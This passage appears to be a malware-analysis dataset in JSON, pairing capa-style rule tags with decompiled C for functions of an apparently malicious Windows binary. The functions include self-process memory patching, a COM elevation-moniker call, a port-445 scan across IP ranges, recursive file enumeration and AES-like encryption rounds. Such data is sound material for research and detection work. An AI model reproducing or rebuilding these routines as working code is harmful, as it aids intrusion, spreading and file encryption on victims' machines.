            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00403ee1(int32_t arg_8h)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    int32_t arg_8h_00;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint uVar5;\n    int32_t iVar6;\n    uint lpFilename;\n    uint var_2a4h;\n    uint var_90h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_48h;\n    int32_t var_3ch;\n    int32_t var_38h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    int32_t var_20h;\n    code *var_1ch;\n    int32_t *var_18h;\n    code *var_14h;\n    code *var_10h;\n    code *var_ch;\n    int32_t hObject;\n    \n    var_24h = 0;\n    arg_8h_00 = fcn.00406347(0x1e, &var_28h);\n    iVar3 = fcn.004090b5(arg_8h_00);\n    hObject = 2;\n    iVar6 = arg_8h_00;\n    do {\n        hObject = hObject + -1;\n        iVar4 = fcn.004090b5(iVar6);\n        iVar6 = iVar6 + 1 + iVar4;\n        var_14h = iVar6;\n    } while (hObject != 0);\n    hObject = 3;\n    iVar6 = arg_8h_00;\n    do {\n        hObject = hObject + -1;\n        iVar4 = fcn.004090b5(iVar6);\n        iVar6 = iVar6 + 1 + iVar4;\n        var_10h = iVar6;\n    } while (hObject != 0);\n    hObject = 4;\n    iVar6 = arg_8h_00;\n    do {\n        hObject = hObject + -1;\n        iVar4 = fcn.004090b5(iVar6);\n        pcVar1 = _sym.imp.KERNEL32.dll_GetModuleHandleA;\n        iVar6 = iVar6 + 1 + iVar4;\n        var_1ch = iVar6;\n    } while (hObject != 0);\n    hObject = -1;\n    uVar5 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(arg_8h_00, iVar3 + 1 + arg_8h_00);\n    pcVar2 = _sym.imp.KERNEL32.dll_GetProcAddress;\n    var_ch = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar5);\n    uVar5 = (*pcVar1)(arg_8h_00, var_14h);\n    var_14h = (*pcVar2)(uVar5);\n    uVar5 = (*pcVar1)(arg_8h_00, var_10h);\n    var_10h = (*pcVar2)(uVar5);\n    uVar5 = (*pcVar1)(arg_8h_00, var_1ch);\n    var_1ch = (*pcVar2)(uVar5);\n    if ((((arg_8h != 0) && (var_ch != NULL)) && (var_14h != NULL)) && ((var_10h != NULL && (var_1ch != NULL)))) {\n        uVar5 = (*_sym.imp.KERNEL32.dll_GetCurrentProcessId)();\n        iVar6 = (*_sym.imp.KERNEL32.dll_OpenProcess)(0x438, 0, uVar5);\n        hObject = iVar6;\n        if (((iVar6 != -1) &&\n            ((iVar3 = (*var_14h)(iVar6, 0, &var_60h, 0x18, 0),  pcVar1 = _sym.imp.KERNEL32.dll_ReadProcessMemory, \n             iVar3 == 0 &&\n             (iVar6 = (*_sym.imp.KERNEL32.dll_ReadProcessMemory)(iVar6, var_5ch, &var_48h, 0x20, 0),  iVar6 != 0)))) &&\n           (iVar6 = (*pcVar1)(hObject, var_3ch, &var_90h, 0x30, 0),  iVar6 != 0)) {\n            (*var_10h)(var_2ch);\n            (*var_ch)(var_38h + 0x38, arg_8h);\n            (*var_ch)(var_38h + 0x40, arg_8h);\n            (*_sym.imp.KERNEL32.dll_GetModuleFileNameW)(0, &lpFilename, 0x104);\n            var_20h = *(var_3ch + 0xc);\n            do {\n                iVar6 = (*pcVar1)(hObject, &var_20h, &var_18h, 4, 0);\n                if ((iVar6 == 0) ||\n                   (iVar6 = (*pcVar1)(hObject, var_18h[10], &var_2a4h, *(var_18h + 0x26), 0),  iVar6 == 0)) break;\n                iVar6 = fcn.00405999();\n                if (iVar6 == 0) {\n                    (*var_ch)(var_18h + 9, arg_8h);\n                    (*var_ch)(var_18h + 0xb, arg_8h);\n                    var_24h = 1;\n                    break;\n                }\n            } while (*var_18h != var_20h);\n            (*var_1ch)(var_2ch);\n        }\n    }\n    (*_sym.imp.KERNEL32.dll_CloseHandle)(hObject);\n    fcn.004039b7(arg_8h_00, var_28h);\n    return var_24h;\n}\n",
        "token_count": 1272
    },
    "0040411d": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040411d(int32_t arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint32_t arg_18h)\n\n{\n    int32_t arg_8h_00;\n    int32_t iVar1;\n    uint uVar2;\n    uint *puVar3;\n    uint pBindOptions;\n    uint var_3ch;\n    uint var_2ch;\n    uint var_1ch;\n    uint var_18h;\n    uint pszName;\n    int32_t *var_10h;\n    code *var_ch;\n    int32_t *var_8h;\n    int32_t *ppv;\n    \n    var_18h = 0;\n    arg_8h_00 = fcn.00406347(0x20, &var_1ch);\n    iVar1 = fcn.004090b5(arg_8h_00);\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(arg_8h_00, iVar1 + 1 + arg_8h_00);\n    var_ch = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar2);\n    pszName = fcn.00406347(0x21, 0);\n    pBindOptions = 0;\n    puVar3 = &var_3ch;\n    for (iVar1 = 8; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    ppv = NULL;\n    var_8h = NULL;\n    var_10h = NULL;\n    if (var_ch == NULL) goto code_r0x00404265;\n    pBindOptions = 0x24;\n    var_2ch = 4;\n    iVar1 = (*_sym.imp.ole32.dll_CoGetObject)(pszName, &pBindOptions, 0x40a1f0, &ppv);\n    if (iVar1 == 0) {\n        iVar1 = (**(*ppv + 0x14))(ppv, (-(0x3a95 < arg_18h) & 0xfffbfbfc) + 0x10840414);\n        if (iVar1 == 0) {\n            iVar1 = (*var_ch)(arg_ch, 0, 0x40a1e0, &var_8h);\n            if (iVar1 == 0) {\n                if (arg_8h == 1) {\n                    iVar1 = (*var_ch)(arg_10h, 0, 0x40a1e0, &var_10h);\n                    if (iVar1 == 0) {\n                        iVar1 = (**(*ppv + 0x40))(ppv, var_8h, var_10h, arg_14h, 0);\ncode_r0x00404226:\n                        if (iVar1 == 0) {\n                            iVar1 = (**(*ppv + 0x54))(ppv);\n                            if (iVar1 == 0) {\n                                var_18h = 1;\n                            }\n                        }\n                    }\n                }\n                else if (arg_8h == 2) {\n                    iVar1 = (**(*ppv + 0x48))(ppv, var_8h, 0);\n                    goto code_r0x00404226;\n                }\n            }\n        }\n    }\n    if (var_10h != NULL) {\n        (**(*var_10h + 8))(var_10h);\n    }\n    if (var_8h != NULL) {\n        (**(*var_8h + 8))(var_8h);\n    }\n    if (ppv != NULL) {\n        (**(*ppv + 8))(ppv);\n    }\ncode_r0x00404265:\n    fcn.004039da(pszName);\n    fcn.004039b7(arg_8h_00, var_1ch);\n    return var_18h;\n}\n",
        "token_count": 864
    },
    "00404325": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00404325(uint arg_8h, int32_t arg_ch, int32_t arg_10h, uint arg_14h)\n\n{\n    ushort *arg_8h_00;\n    int32_t iVar1;\n    ushort *puVar2;\n    int32_t iVar3;\n    code *arg_ch_00;\n    uint var_10h;\n    ushort *var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    arg_8h_00 = fcn.00403bb3(0x22);\n    iVar1 = fcn.004090c6(arg_8h_00);\n    puVar2 = fcn.00409116(arg_8h_00, 0x3b);\n    *puVar2 = 0;\n    var_ch = fcn.00409116(puVar2 + 1, 0x3b);\n    *var_ch = 0;\n    var_4h = 0;\n    var_ch = var_ch + 1;\n    var_10h = arg_8h;\n    var_8h = arg_14h;\n    iVar3 = (*_sym.imp.ole32.dll_CoInitializeEx)(0, 6);\n    if (iVar3 == 0) {\n        arg_ch_00 = fcn.004042bd;\n        if (arg_ch == 0) {\n            arg_ch_00 = fcn.00404281;\n        }\n        puVar2 = puVar2 + 1;\n        if (arg_10h == 0) {\n            puVar2 = arg_8h_00;\n        }\n        fcn.00405d61(puVar2, arg_ch_00, &var_10h, 0x104, 1);\n        (*_sym.imp.ole32.dll_CoUninitialize)();\n    }\n    fcn.004039b7(arg_8h_00, iVar1 * 2 + 2);\n    return var_4h;\n}\n",
        "token_count": 436
    },
    "00405067": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: buf\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00405067(uint32_t hostlong, uint arg_ch)\n\n{\n    int32_t *piVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint var_48h;\n    uint var_44h;\n    uint name;\n    uint var_34h;\n    uchar uStack52;\n    uint uStack51;\n    ushort uStack47;\n    uchar uStack45;\n    uint namelen;\n    uint optlen;\n    uint argp;\n    uint32_t var_1ch;\n    int32_t var_18h;\n    uint32_t var_14h;\n    int32_t optval;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint buf;\n    \n    name._0_2_ = 2;\n    var_14h = hostlong + in_EAX;\n    name._2_2_ = (*_sym.imp.WS2_32.dll_htons)(0x1bd);\n    var_34h = 0;\n    uStack52 = 0;\n    uStack51 = 0;\n    uStack47 = 0;\n    uStack45 = 0;\n    var_ch = fcn.0040905b(0x200, 4);\n    var_18h = fcn.0040905b(0x200, 4);\n    if (hostlong < hostlong + in_EAX) {\n        while (uVar4 = 0,  hostlong < var_14h) {\n            do {\n                if (0x1ff < uVar4) break;\n                argp = 1;\n                var_34h = (*_sym.imp.WS2_32.dll_htonl)(hostlong);\n                hostlong = hostlong + 1;\n                iVar2 = (*_sym.imp.WS2_32.dll_socket)(2, 1, 6);\n                if (((iVar2 != 0) && (iVar3 = (*_sym.imp.WS2_32.dll_ioctlsocket)(iVar2, 0x8004667e, &argp),  iVar3 == 0)\n                    ) && ((iVar3 = (*_sym.imp.WS2_32.dll_connect)(iVar2, &name, 0x10),  iVar3 == 0 ||\n                          (iVar3 = (*_sym.imp.WS2_32.dll_WSAGetLastError)(),  iVar3 == 0x2733)))) {\n                    *(var_ch + uVar4 * 4) = iVar2;\n                    uVar4 = uVar4 + 1;\n                }\n            } while (hostlong < var_14h);\n            if (uVar4 != 0) {\n                fcn.00404fa9(var_ch);\n                var_8h = 0;\n                do {\n                    uVar4 = uVar4 - 1;\n                    piVar1 = var_ch + uVar4 * 4;\n                    var_1ch = uVar4;\n                    if (*piVar1 != 0) {\n                        optlen = 4;\n                        iVar2 = (*_sym.imp.WS2_32.dll_getsockopt)(*piVar1, 0xffff, 0x1007, &optval, &optlen);\n                        if ((iVar2 == 0) && (optval == 0)) {\n                            iVar2 = (*_sym.imp.WS2_32.dll_recv)(*piVar1, &buf, 1, 2);\n                            if (iVar2 == -1) {\n                                optval = (*_sym.imp.WS2_32.dll_WSAGetLastError)();\n                            }\n                            if ((iVar2 == 0) || (uVar4 = var_1ch,  optval == 0x2733)) {\n                                namelen = 0x10;\n                                (*_sym.imp.WS2_32.dll_getpeername)(*piVar1, &var_48h, &namelen);\n                                *(var_18h + var_8h * 4) = var_44h;\n                                uVar4 = var_1ch;\n                                var_8h = var_8h + 1;\n                            }\n                        }\n                    }\n                    (*_sym.imp.WS2_32.dll_closesocket)(*piVar1);\n                } while (uVar4 != 0);\n                while (var_8h != 0) {\n                    var_8h = var_8h + -1;\n                    iVar2 = fcn.00402084(var_44h, arg_ch);\n                    if (iVar2 == 0) goto code_r0x00405219;\n                }\n            }\n            if (var_14h <= hostlong) break;\n        }\n    }\ncode_r0x00405219:\n    fcn.004090a1(var_ch);\n    fcn.004090a1(var_18h);\n    return;\n}\n",
        "token_count": 1083
    },
    "004054bf": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004054bf(int32_t **arg_8h)\n\n{\n    int32_t arg_ch;\n    int32_t iVar1;\n    int32_t *piVar2;\n    code *pcVar3;\n    int32_t iVar4;\n    int32_t arg_8h_00;\n    int32_t *arg_8h_01;\n    int32_t iVar5;\n    int32_t *piVar6;\n    int32_t iVar7;\n    uint unaff_EBX;\n    uint uStack28;\n    uchar auStack24 [20];\n    \n    uStack28 = 0;\n    iVar4 = fcn.00409041(0x10000);\n    arg_8h_00 = fcn.00409041(0x10000);\n    iVar7 = **arg_8h;\n    iVar1 = (*arg_8h)[1];\n    arg_ch = iVar7 + 0xc;\n    arg_8h_01 = fcn.00409041(0x28);\n    if (arg_8h_01 != NULL) {\n        arg_8h_01[9] = 0x110102;\n        iVar5 = fcn.00409041(0x110102);\n        arg_8h_01[8] = iVar5;\n        if (iVar5 == 0) {\n            fcn.004090a1(arg_8h_01);\n            arg_8h_01 = NULL;\n        }\n        else {\n            fcn.00408fd7(arg_8h_01 + 6, iVar7, 6);\n            fcn.00408fd7(arg_8h_01 + 1, arg_ch, 0x14);\n            *arg_8h_01 = iVar1;\n        }\n        if (((arg_8h_01 != NULL) && (iVar4 != 0)) && (arg_8h_00 != 0)) {\n            fcn.00403d4b(&uStack28, 0);\n            while( true ) {\n                pcVar3 = _sym.imp.KERNEL32.dll_EnterCriticalSection;\n                piVar2 = arg_8h[1];\n                piVar6 = piVar2 + 3;\n                while( true ) {\n                    (*pcVar3)(piVar6);\n                    piVar6 = fcn.004034eb(unaff_EBX);\n                    if ((piVar6 != NULL) || ((*(piVar2 + 10) & 1) != 0)) break;\n                    (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(arg_8h_00);\n                    (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(piVar2[1], 0xffffffff);\n                }\n                (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(arg_8h_00);\n                if (arg_ch == 0) goto code_r0x00405655;\n                iVar7 = fcn.00405962();\n                if (iVar7 != 0) break;\n                iVar7 = fcn.004059f1(arg_8h_00, 0x7fff, 2);\n                if (iVar7 != 0) {\n                    fcn.004078a3(auStack24);\n                    piVar6 = *arg_8h;\n                    iVar7 = fcn.0040868f();\n                    if (iVar7 == 0) goto code_r0x00405655;\n                    fcn.00408ebe(arg_8h_01, auStack24, arg_8h_00, *(*piVar6 + 0x24));\n                }\n            }\n            fcn.004033c5();\ncode_r0x00405655:\n            fcn.00403d4b(uStack28, 1);\n        }\n    }\n    fcn.004033c5();\n    if (arg_8h_01 != NULL) {\n        if (arg_8h_01[8] != 0) {\n            fcn.004090a1(arg_8h_01[8]);\n        }\n        fcn.004090a1(arg_8h_01);\n    }\n    if (iVar4 != 0) {\n        fcn.004090a1(iVar4);\n    }\n    if (arg_8h_00 != 0) {\n        fcn.004090a1(arg_8h_00);\n    }\n    return 0;\n}\n",
        "token_count": 952
    },
    "004056b3": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004056b3(int32_t *arg_8h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uint uStack44;\n    int32_t iStack40;\n    int32_t *piStack36;\n    int32_t aiStack32 [3];\n    int32_t *piStack20;\n    int32_t iStack16;\n    int32_t iStack12;\n    \n    iVar2 = fcn.004032ff();\n    iVar3 = fcn.00409041(0x10000);\n    uStack44 = 0;\n    iStack40 = iVar3;\n    iVar4 = fcn.00402fc8(*(*arg_8h + 0x20), arg_8h[4]);\n    if (iVar4 != 0) {\n        if ((iVar2 != 0) && (iVar3 != 0)) {\n            fcn.00405bf7();\n            fcn.00403955(arg_8h[2], 0x41, iVar3);\n            uVar5 = 0;\n            fcn.00403d4b(&uStack44, 0);\n            piStack36 = arg_8h;\n            aiStack32[0] = iVar2;\n            do {\n                iVar3 = (*_sym.imp.KERNEL32.dll_CreateThread)(0, 1, fcn.004054bf, &piStack36, 0, 0);\n                aiStack32[uVar5 + 1] = iVar3;\n                if (iVar3 == 0) break;\n                uVar5 = uVar5 + 1;\n            } while (uVar5 < 2);\n            if (uVar5 == 2) {\n                iStack12 = iStack40;\n                piStack20 = arg_8h;\n                iStack16 = iVar2;\n                fcn.00405d61(arg_8h[4], fcn.00405444, &piStack20, 0x7fff, 0x80);\n            }\n            iVar3 = fcn.00405962();\n            if (iVar3 != 0) {\n                fcn.004033c5();\n            }\n            (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(*(iVar2 + 8), 0xffffffff);\n            fcn.004033c5();\n            (*_sym.imp.KERNEL32.dll_WaitForMultipleObjects)(uVar5, &piStack36, 1, 0xffffffff);\n            while (uVar5 != 0) {\n                piVar1 = aiStack32 + uVar5;\n                uVar5 = uVar5 - 1;\n                if (*piVar1 != 0) {\n                    (*_sym.imp.KERNEL32.dll_CloseHandle)(*piVar1);\n                }\n            }\n            fcn.00403d4b(uStack44, 1);\n            iVar3 = iStack40;\n        }\n        fcn.00405bf7();\n        fcn.00403955(arg_8h[2], 0x42, iVar3);\n    }\n    if (iVar3 != 0) {\n        fcn.004090a1(iVar3);\n    }\n    if (iVar2 != 0) {\n        fcn.004032a6();\n    }\n    fcn.004053e5();\n    fcn.0040861b(arg_8h[1]);\n    fcn.004090a1(arg_8h[4]);\n    fcn.004090a1(arg_8h);\n    return 0;\n}\n",
        "token_count": 791
    },
    "004059f1": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nbool __cdecl fcn.004059f1(int32_t arg_8h, uint32_t arg_ch, int32_t arg_10h)\n\n{\n    uint uVar1;\n    uint *puVar2;\n    uint32_t uVar3;\n    uint var_4h;\n    \n    if (arg_10h != 0) {\n        puVar2 = &arg_10h;\n        do {\n            puVar2 = puVar2 + 1;\n            uVar1 = *puVar2;\n            uVar3 = fcn.004090c6(uVar1);\n            if (arg_ch < uVar3) break;\n            fcn.0040927d(arg_8h, uVar1);\n            arg_ch = arg_ch - uVar3;\n            arg_10h = arg_10h + -1;\n            arg_8h = arg_8h + uVar3 * 2;\n        } while (arg_10h != 0);\n    }\n    return arg_10h == 0;\n}\n",
        "token_count": 224
    },
    "00405a46": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.00405a46(uint param_1, uint32_t param_2)\n\n{\n    uint32_t in_EAX;\n    uint32_t uVar1;\n    char16_t *pcVar2;\n    uint32_t uVar3;\n    char16_t *unaff_EDI;\n    \n    uVar3 = 0;\n    uVar1 = in_EAX;\n    if (in_EAX != 0) {\n        do {\n            uVar1 = uVar1 >> 4;\n            uVar3 = uVar3 + 1;\n        } while (uVar1 != 0);\n        uVar1 = uVar3;\n        if (param_2 < uVar3) goto code_r0x00405a5f;\n    }\n    uVar1 = param_2;\ncode_r0x00405a5f:\n    if (uVar1 == 0) {\n        uVar3 = 1;\n    }\n    else {\n        if (uVar3 <= param_2) {\n            uVar3 = param_2;\n        }\n        if (8 < uVar3) {\n            return 0;\n        }\n    }\n    pcVar2 = unaff_EDI + uVar3;\n    *pcVar2 = L'\\0';\n    if (in_EAX != 0) {\n        do {\n            uVar1 = in_EAX / 0x10;\n            pcVar2 = pcVar2 + -1;\n            *pcVar2 = L\"0123456789ABCDEF\"[in_EAX % 0x10];\n            in_EAX = uVar1;\n        } while (uVar1 != 0);\n    }\n    while (unaff_EDI < pcVar2) {\n        pcVar2 = pcVar2 + -1;\n        *pcVar2 = L'0';\n    }\n    return uVar3;\n}\n",
        "token_count": 408
    },
    "00405ab0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.00405ab0(uint param_1, uint32_t param_2)\n\n{\n    uint32_t in_EAX;\n    uint32_t uVar1;\n    uchar *puVar2;\n    uint32_t uVar3;\n    uchar *unaff_EDI;\n    \n    uVar3 = 0;\n    uVar1 = in_EAX;\n    if (in_EAX != 0) {\n        do {\n            uVar1 = uVar1 >> 4;\n            uVar3 = uVar3 + 1;\n        } while (uVar1 != 0);\n        uVar1 = uVar3;\n        if (param_2 < uVar3) goto code_r0x00405ac9;\n    }\n    uVar1 = param_2;\ncode_r0x00405ac9:\n    if (uVar1 == 0) {\n        uVar3 = 1;\n    }\n    else {\n        if (uVar3 <= param_2) {\n            uVar3 = param_2;\n        }\n        if (8 < uVar3) {\n            return 0;\n        }\n    }\n    puVar2 = unaff_EDI + uVar3;\n    *puVar2 = 0;\n    if (in_EAX != 0) {\n        do {\n            uVar1 = in_EAX / 0x10;\n            puVar2 = puVar2 + -1;\n            *puVar2 = *(in_EAX % 0x10 + 0x40a3dc);\n            in_EAX = uVar1;\n        } while (uVar1 != 0);\n    }\n    while (unaff_EDI < puVar2) {\n        puVar2 = puVar2 + -1;\n        *puVar2 = 0x30;\n    }\n    return uVar3;\n}\n",
        "token_count": 402
    },
    "00405d61": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.00405d61(int32_t arg_8h, code *arg_ch, uint arg_10h, uint32_t arg_14h, int32_t arg_18h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint lpFindFileData;\n    uint var_230h;\n    int16_t var_22ch;\n    int32_t hFindFile;\n    int32_t var_8h;\n    \n    var_8h = 0;\n    if (((arg_8h != 0) && (iVar1 = fcn.004090c6(arg_8h),  iVar1 + 2U <= arg_14h)) &&\n       (iVar1 = fcn.00409041(arg_14h * 2 + 2),  iVar1 != 0)) {\n        fcn.0040927d(iVar1, arg_8h);\n        fcn.004092b4(iVar1, 0x40a414);\n        hFindFile = (*_sym.imp.KERNEL32.dll_FindFirstFileW)(iVar1, &lpFindFileData);\n        if (hFindFile != -1) {\n            do {\n                if ((var_230h != 0x2e) || ((var_230h._2_2_ != 0 && ((var_230h._2_2_ != 0x2e || (var_22ch != 0)))))) {\n                    iVar2 = fcn.004090c6(arg_8h);\n                    iVar3 = fcn.004090c6(&var_230h);\n                    if (iVar2 + 1 + iVar3 <= arg_14h) {\n                        fcn.0040927d(iVar1, arg_8h);\n                        fcn.004092b4(iVar1, 0x40a208);\n                        fcn.004092b4(iVar1, &var_230h);\n                        iVar2 = (*arg_ch)(arg_8h, iVar1, &lpFindFileData, arg_10h);\n                        if (iVar2 != 0) {\n                            if (iVar2 < 0) break;\n                            if ((arg_18h == 0) || ((lpFindFileData & 0x10) == 0)) {\n                                var_8h = var_8h + 1;\n                            }\n                            else {\n                                iVar2 = fcn.00405d61(iVar1, arg_ch, arg_10h, arg_14h, arg_18h + -1);\n                                var_8h = var_8h + iVar2;\n                            }\n                        }\n                    }\n                }\n                iVar2 = (*_sym.imp.KERNEL32.dll_FindNextFileW)(hFindFile, &lpFindFileData);\n            } while (iVar2 != 0);\n            (*_sym.imp.KERNEL32.dll_FindClose)(hFindFile);\n        }\n        fcn.004090a1(iVar1);\n    }\n    return var_8h;\n}\n",
        "token_count": 671
    },
    "0040616c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0040616c(uint arg_8h, uint arg_ch, uint arg_10h, uint32_t arg_14h, int32_t *arg_18h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    \n    while( true ) {\n        if (*arg_18h == 0) {\n            return 0;\n        }\n        iVar1 = fcn.00409216(arg_8h, *arg_18h, arg_ch);\n        if (iVar1 == 0) break;\n        arg_18h = arg_18h + 2;\n    }\n    uVar2 = fcn.004090c6(arg_18h[1]);\n    if (arg_14h < uVar2) {\n        return uVar2;\n    }\n    fcn.00408fd7(arg_10h, arg_18h[1], uVar2 * 2);\n    return uVar2;\n}\n",
        "token_count": 213
    },
    "004061be": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.004061be(uint arg_8h, uint arg_ch, uint arg_10h, uint32_t arg_14h, int32_t *arg_18h)\n\n{\n    int32_t iVar1;\n    uint32_t arg_10h_00;\n    \n    while( true ) {\n        if (*arg_18h == 0) {\n            return 0;\n        }\n        iVar1 = fcn.0040924d(arg_8h, *arg_18h, arg_ch);\n        if (iVar1 == 0) break;\n        arg_18h = arg_18h + 2;\n    }\n    arg_10h_00 = fcn.004090b5(arg_18h[1]);\n    if (arg_14h < arg_10h_00) {\n        return arg_10h_00;\n    }\n    fcn.00408fd7(arg_10h, arg_18h[1], arg_10h_00);\n    return arg_10h_00;\n}\n",
        "token_count": 228
    },
    "004062a6": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t * fcn.004062a6(uint param_1)\n\n{\n    int32_t *in_EAX;\n    int32_t *piVar1;\n    int32_t iVar2;\n    \n    piVar1 = fcn.00409041(0x30);\n    if (piVar1 != NULL) {\n        iVar2 = fcn.00409041(in_EAX[1]);\n        piVar1[2] = iVar2;\n        iVar2 = fcn.00409041(*in_EAX * 0xc);\n        piVar1[1] = 0;\n        piVar1[3] = 0;\n        *piVar1 = iVar2;\n        fcn.00408fa9(piVar1 + 4, 0, 0x20);\n        if ((piVar1[2] == 0) || (*piVar1 == 0)) {\n            fcn.00406274();\n            piVar1 = NULL;\n        }\n        else {\n            piVar1[1] = *in_EAX;\n            piVar1[3] = in_EAX[1];\n            fcn.00408fd7(*piVar1, in_EAX + 2, piVar1[1] * 0xc);\n            fcn.00408fd7(piVar1[2], in_EAX + 2 + piVar1[1] * 3, piVar1[3]);\n            fcn.00408fd7(piVar1 + 4, param_1, 0x20);\n        }\n    }\n    return piVar1;\n}\n",
        "token_count": 343
    },
    "00406a04": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00406a04(int32_t *arg_8h)\n\n{\n    uint32_t *in_EAX;\n    uint32_t *puVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    uchar *unaff_ESI;\n    uint32_t uVar9;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint32_t var_ch;\n    uint32_t var_8h;\n    uint32_t var_4h;\n    \n    puVar1 = arg_8h[1];\n    var_4h = *in_EAX ^ *puVar1;\n    var_8h = in_EAX[1] ^ puVar1[1];\n    uVar7 = in_EAX[2] ^ puVar1[2];\n    var_ch = in_EAX[3] ^ puVar1[3];\n    iVar2 = *arg_8h >> 1;\n    puVar1 = puVar1 + 4;\n    while( true ) {\n        iVar2 = iVar2 + -1;\n        if (iVar2 < 1) break;\n        uVar4 = *((var_ch >> 0x10 & 0xff) * 4 + 0x40c970) ^ *((uVar7 >> 8 & 0xff) * 4 + 0x40cd70) ^\n                *((var_4h >> 0x18) * 4 + 0x40c570) ^ *((var_8h & 0xff) * 4 + 0x40d170) ^ puVar1[1];\n        uVar5 = *((var_ch >> 8 & 0xff) * 4 + 0x40cd70) ^ *((var_4h >> 0x10 & 0xff) * 4 + 0x40c970) ^\n                *((var_8h >> 0x18) * 4 + 0x40c570) ^ *((uVar7 & 0xff) * 4 + 0x40d170) ^ puVar1[2];\n        uVar3 = *((uVar7 >> 0x10 & 0xff) * 4 + 0x40c970) ^ *((var_8h >> 8 & 